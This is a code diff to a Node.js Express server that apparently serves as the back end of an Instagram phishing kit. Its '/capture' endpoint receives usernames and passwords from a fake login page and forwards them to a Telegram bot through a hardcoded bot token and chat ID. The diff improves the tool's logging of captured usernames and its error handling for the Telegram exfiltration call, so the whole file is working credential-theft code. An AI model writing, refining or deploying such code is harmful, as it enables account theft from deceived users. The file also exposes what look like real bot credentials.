@@ -3,9 +3,9 @@ const cors = require('cors');
 const fetch = require('node-fetch');
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 8080;
 
-// YOUR TELEGRAM DETAILS
+// Your details
 const TELEGRAM_TOKEN = "8696476669:AAGMMBP7BKj3f_D4KwMU4xbVMEj4q_hZqr4";
 const CHAT_ID = "8725339154";
 
@@ -16,11 +16,11 @@ app.use(express.static(__dirname));
 app.post('/capture', async (req, res) => {
     const { username, password, target, time } = req.body || {};
 
+    console.log(`[CAPTURED] Username: ${username || 'N/A'} | Attempt: ${req.body.attempt || 'unknown'}`);
+
     if (!username || !password) {
         return res.json({ success: true });
     }
-
-    console.log(`[CAPTURED] Username: ${username}`);
 
     const message = `
 *Instagram Login Captured* 🔥
@@ -32,7 +32,7 @@ app.post('/capture', async (req, res) => {
     `.trim();
 
     try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
@@ -41,9 +41,15 @@ app.post('/capture', async (req, res) => {
                 parse_mode: "MarkdownV2"
             })
         });
-        console.log("✅ Sent to Telegram successfully");
+
+        if (response.ok) {
+            console.log("✅ Sent to Telegram successfully");
+        } else {
+            const errorText = await response.text();
+            console.error(`❌ Telegram API Error ${response.status}:`, errorText);
+        }
     } catch (err) {
-        console.error("❌ Telegram error:", err.message);
+        console.error("❌ Failed to connect to Telegram:", err.message);
     }
 
     res.json({ success: true });
@@ -51,4 +57,5 @@ app.post('/capture', async (req, res) => {
 
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`Bot ready - Chat ID: ${CHAT_ID}`);
 });
